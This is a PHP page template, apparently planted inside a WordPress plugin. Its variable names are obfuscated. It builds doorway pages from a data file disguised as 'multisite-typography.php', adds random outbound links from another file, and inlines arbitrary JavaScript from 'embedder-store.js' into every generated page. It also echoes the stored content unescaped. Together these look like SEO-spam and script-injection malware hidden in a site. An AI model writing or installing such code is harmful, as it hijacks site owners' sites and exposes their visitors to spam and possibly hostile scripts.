<?php
$gyoDN5 = intval(get_query_var('yufjcxbwyj'));

if ($gyoDN5 < 1 || $gyoDN5 > 5917) return;
$xzRjUzVsZ = file(plugin_dir_path(__FILE__).'multisite-typography.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$ft1SjQEC = explode(';', $xzRjUzVsZ[$gyoDN5]);
if (count($ft1SjQEC) < 2) return;
$fN4QK6O = $ft1SjQEC[0];
$aBFDFH2qK  = $ft1SjQEC[1];
$quCbYeX = $ft1SjQEC[2];
$vwbJgb4w7  = $ft1SjQEC[3];
$fBmrw9 = $ft1SjQEC[4];
set_query_var('eizeche', $fN4QK6O);

$u4Khvd = '';
$dwnXmgI3 = plugin_dir_path(__FILE__).'official-tables.php';
if (is_file($dwnXmgI3)) {
	$dIyndyv = file($dwnXmgI3, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($dIyndyv);
	shuffle($dIyndyv);
	$kml8e4Wo6 = mt_rand(2, 5);
	if (count($dIyndyv) > $kml8e4Wo6) {
		for ($yYAhVL = 0; $yYAhVL < $kml8e4Wo6; $yYAhVL++) {
			$hjpVMPD = array_shift($dIyndyv);
			$u4Khvd .= '<p><a href="'.$hjpVMPD.'">'.$hjpVMPD.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $fN4QK6O; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $aBFDFH2qK . "</p>\n";
				if (strlen($vwbJgb4w7) > 0) echo "<p>" . $vwbJgb4w7 . "</p>\n";
				if (strlen($quCbYeX) > 0) echo "<p>" . $quCbYeX . "</p>\n";
				if (strlen($fBmrw9) > 0) echo '<p><a href="#"><img src="'.$fBmrw9.'"></a>' . "</p>\n";
				echo $u4Khvd;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$igiz2N = plugin_dir_path(__FILE__) . 'embedder-store.js';
if (is_file($igiz2N)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($igiz2N);
	echo '</script>';
}
get_footer();
?>
